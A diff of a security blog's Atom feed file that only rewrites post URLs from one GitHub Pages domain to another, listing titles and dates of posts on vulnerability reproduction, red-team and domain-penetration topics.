+    <link href="http://jiushill.github.io/posts/9c6a5f14.html"/>
+    <id>http://jiushill.github.io/posts/9c6a5f14.html</id>
     <published>2022-08-12T16:12:54.000Z</published>
     <updated>2022-08-12T16:31:12.054Z</updated>
     
@@ -56,14 +56,14 @@
     
     
     
-    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
+    <category term="代码审计" scheme="http://jiushill.github.io/tags/代码审计/"/>
     
   </entry>
   
   <entry>
     <title>iscsicpl.exe ByPassUac复现</title>
-    <link href="http://422926799.github.io/posts/c08eee8b.html"/>
-    <id>http://422926799.github.io/posts/c08eee8b.html</id>
+    <link href="http://jiushill.github.io/posts/c08eee8b.html"/>
+    <id>http://jiushill.github.io/posts/c08eee8b.html</id>
     <published>2022-07-15T19:05:19.000Z</published>
     <updated>2022-07-15T21:19:16.698Z</updated>
     
@@ -79,14 +79,14 @@
     
     
     
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
     
   </entry>
   
   <entry>
     <title>CVE-2022-30190 样本分析与漏洞复现</title>
-    <link href="http://422926799.github.io/posts/e94de9d7.html"/>
-    <id>http://422926799.github.io/posts/e94de9d7.html</id>
+    <link href="http://jiushill.github.io/posts/e94de9d7.html"/>
+    <id>http://jiushill.github.io/posts/e94de9d7.html</id>
     <published>2022-05-31T17:53:23.000Z</published>
     <updated>2022-05-31T18:16:00.263Z</updated>
     
@@ -101,14 +101,14 @@
     
     
     
-    <category term="样本分析" scheme="http://422926799.github.io/tags/样本分析/"/>
+    <category term="样本分析" scheme="http://jiushill.github.io/tags/样本分析/"/>
     
   </entry>
   
   <entry>
     <title>syscall学习</title>
-    <link href="http://422926799.github.io/posts/87f73904.html"/>
-    <id>http://422926799.github.io/posts/87f73904.html</id>
+    <link href="http://jiushill.github.io/posts/87f73904.html"/>
+    <id>http://jiushill.github.io/posts/87f73904.html</id>
     <published>2022-04-08T18:39:56.000Z</published>
     <updated>2022-04-08T18:51:16.610Z</updated>
     
@@ -124,14 +124,14 @@
     
     
     
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
     
   </entry>
   
   <entry>
     <title>蓝凌OA前台SSRF+dataxml.jsp RCE漏洞分析</title>
-    <link href="http://422926799.github.io/posts/980cff8b.html"/>
-    <id>http://422926799.github.io/posts/980cff8b.html</id>
+    <link href="http://jiushill.github.io/posts/980cff8b.html"/>
+    <id>http://jiushill.github.io/posts/980cff8b.html</id>
     <published>2022-03-03T11:39:28.000Z</published>
     <updated>2022-03-03T11:55:55.464Z</updated>
     
@@ -146,14 +146,14 @@
     
     
     
-    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
+    <category term="代码审计" scheme="http://jiushill.github.io/tags/代码审计/"/>
     
   </entry>
   
   <entry>
     <title>向日葵RCE漏洞复现分析</title>
-    <link href="http://422926799.github.io/posts/c5ac22a4.html"/>
-    <id>http://422926799.github.io/posts/c5ac22a4.html</id>
+    <link href="http://jiushill.github.io/posts/c5ac22a4.html"/>
+    <id>http://jiushill.github.io/posts/c5ac22a4.html</id>
     <published>2022-02-17T15:45:27.000Z</published>
     <updated>2022-02-19T05:45:14.021Z</updated>
     
@@ -169,14 +169,14 @@
     
     
     
-    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
     
   </entry>
   
   <entry>
     <title>pkexec提权漏洞复现</title>
-    <link href="http://422926799.github.io/posts/2b1cd54.html"/>
-    <id>http://422926799.github.io/posts/2b1cd54.html</id>
+    <link href="http://jiushill.github.io/posts/2b1cd54.html"/>
+    <id>http://jiushill.github.io/posts/2b1cd54.html</id>
     <published>2022-01-28T09:04:55.000Z</published>
     <updated>2022-02-17T15:59:28.847Z</updated>
     
@@ -191,14 +191,14 @@
     
     
     
-    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
     
   </entry>
   
   <entry>
     <title>Exchange ProxyShell漏洞复现</title>
-    <link href="http://422926799.github.io/posts/e4d494fa.html"/>
-    <id>http://422926799.github.io/posts/e4d494fa.html</id>
+    <link href="http://jiushill.github.io/posts/e4d494fa.html"/>
+    <id>http://jiushill.github.io/posts/e4d494fa.html</id>
     <published>2022-01-21T15:59:02.000Z</published>
     <updated>2022-01-21T17:38:30.822Z</updated>
     
@@ -214,14 +214,14 @@
     
     
     
-    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
     
   </entry>
   
   <entry>
     <title>svchost.exe挂载DLL</title>
-    <link href="http://422926799.github.io/posts/3047149d.html"/>
-    <id>http://422926799.github.io/posts/3047149d.html</id>
+    <link href="http://jiushill.github.io/posts/3047149d.html"/>
+    <id>http://jiushill.github.io/posts/3047149d.html</id>
     <published>2022-01-15T17:28:39.000Z</published>
     <updated>2022-01-15T17:36:01.766Z</updated>
     
@@ -236,14 +236,14 @@
     
     
     
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
     
   </entry>
   
   <entry>
     <title>userAccountControl将ID设置为8192作为后门</title>
-    <link href="http://422926799.github.io/posts/a984f0cd.html"/>
-    <id>http://422926799.github.io/posts/a984f0cd.html</id>
+    <link href="http://jiushill.github.io/posts/a984f0cd.html"/>
+    <id>http://jiushill.github.io/posts/a984f0cd.html</id>
     <published>2022-01-15T17:02:29.000Z</published>
     <updated>2022-01-15T17:25:17.889Z</updated>
     
@@ -258,14 +258,14 @@
     
     
     
-    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
+    <category term="域渗透" scheme="http://jiushill.github.io/tags/域渗透/"/>
     
   </entry>
   
   <entry>
     <title>DLL镂空不使用Loadlibrary</title>
-    <link href="http://422926799.github.io/posts/c34749bd.html"/>
-    <id>http://422926799.github.io/posts/c34749bd.html</id>
+    <link href="http://jiushill.github.io/posts/c34749bd.html"/>
+    <id>http://jiushill.github.io/posts/c34749bd.html</id>
     <published>2022-01-15T16:41:30.000Z</published>
     <updated>2022-01-15T16:56:12.191Z</updated>
     
@@ -281,14 +281,14 @@
     
     
     
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
     
   </entry>
   
   <entry>
     <title>CVE-2021-42287/CVE-2021-42278 域内翻身做主人</title>
-    <link href="http://422926799.github.io/posts/f591678b.html"/>
-    <id>http://422926799.github.io/posts/f591678b.html</id>
+    <link href="http://jiushill.github.io/posts/f591678b.html"/>
+    <id>http://jiushill.github.io/posts/f591678b.html</id>
     <published>2021-12-14T17:11:47.000Z</published>
     <updated>2021-12-14T17:31:46.036Z</updated>
     
@@ -303,14 +303,14 @@
     
     
     
-    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
+    <category term="域渗透" scheme="http://jiushill.github.io/tags/域渗透/"/>
     
   </entry>
   
   <entry>
     <title>log4j漏洞复现</title>
-    <link href="http://422926799.github.io/posts/98d13101.html"/>
-    <id>http://422926799.github.io/posts/98d13101.html</id>
+    <link href="http://jiushill.github.io/posts/98d13101.html"/>
+    <id>http://jiushill.github.io/posts/98d13101.html</id>
     <published>2021-12-14T16:38:49.000Z</published>
     <updated>2021-12-14T17:09:38.931Z</updated>
     
@@ -325,14 +325,14 @@
     
     
     
-    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
     
   </entry>
   
   <entry>
     <title>某DCS zip Slip任意写文件漏洞</title>
-    <link href="http://422926799.github.io/posts/d1787975.html"/>
-    <id>http://422926799.github.io/posts/d1787975.html</id>
+    <link href="http://jiushill.github.io/posts/d1787975.html"/>
+    <id>http://jiushill.github.io/posts/d1787975.html</id>
     <published>2021-12-05T00:53:20.000Z</published>
     <updated>2021-12-05T01:17:37.089Z</updated>
     
@@ -351,8 +351,8 @@
   
   <entry>
     <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</title>
-    <link href="http://422926799.github.io/posts/3541f020.html"/>
-    <id>http://422926799.github.io/posts/3541f020.html</id>
+    <link href="http://jiushill.github.io/posts/3541f020.html"/>
+    <id>http://jiushill.github.io/posts/3541f020.html</id>
     <published>2021-10-18T13:56:13.000Z</published>
     <updated>2021-10-18T14:09:23.686Z</updated>
     
@@ -367,14 +367,14 @@
     
     
     
-    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
+    <category term="Writing" scheme="http://jiushill.github.io/tags/Writing/"/>
     
   </entry>
   
   <entry>
     <title>Exchange (CVE-2021-26855和CVE-2021-27065)复现</title>
-    <link href="http://422926799.github.io/posts/a0e15799.html"/>
-    <id>http://422926799.github.io/posts/a0e15799.html</id>
+    <link href="http://jiushill.github.io/posts/a0e15799.html"/>
+    <id>http://jiushill.github.io/posts/a0e15799.html</id>
     <published>2021-09-23T08:39:40.000Z</published>
     <updated>2021-09-23T09:48:04.266Z</updated>
     
@@ -391,14 +391,14 @@
     
     
     
-    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
     
   </entry>
   
   <entry>
     <title>CVE-2021-40444漏洞复现</title>
-    <link href="http://422926799.github.io/posts/3e27999a.html"/>
-    <id>http://422926799.github.io/posts/3e27999a.html</id>
+    <link href="http://jiushill.github.io/posts/3e27999a.html"/>
+    <id>http://jiushill.github.io/posts/3e27999a.html</id>
     <published>2021-09-13T08:25:37.000Z</published>
     <updated>2021-09-13T08:48:34.866Z</updated>
     
@@ -414,14 +414,14 @@
     
     
     
-    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
+    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
     
   </entry>
   
   <entry>
     <title>关于这几天cs进程里的特征和网上的一些bypass</title>
-    <link href="http://422926799.github.io/posts/40a5ffce.html"/>
-    <id>http://422926799.github.io/posts/40a5ffce.html</id>
+    <link href="http://jiushill.github.io/posts/40a5ffce.html"/>
+    <id>http://jiushill.github.io/posts/40a5ffce.html</id>
     <published>2021-09-11T09:53:15.000Z</published>
     <updated>2021-09-11T10:08:32.260Z</updated>
     
@@ -436,14 +436,14 @@
     
     
     
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
     
   </entry>
   
   <entry>
     <title>DLL转shellcode研究</title>
-    <link href="http://422926799.github.io/posts/8f26af05.html"/>
-    <id>http://422926799.github.io/posts/8f26af05.html</id>
+    <link href="http://jiushill.github.io/posts/8f26af05.html"/>
+    <id>http://jiushill.github.io/posts/8f26af05.html</id>
     <published>2021-09-09T09:18:53.000Z</published>
     <updated>2021-09-09T09:41:31.391Z</updated>
     
@@ -459,7 +459,7 @@
     
     
     
-    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
     
   </entry>
   
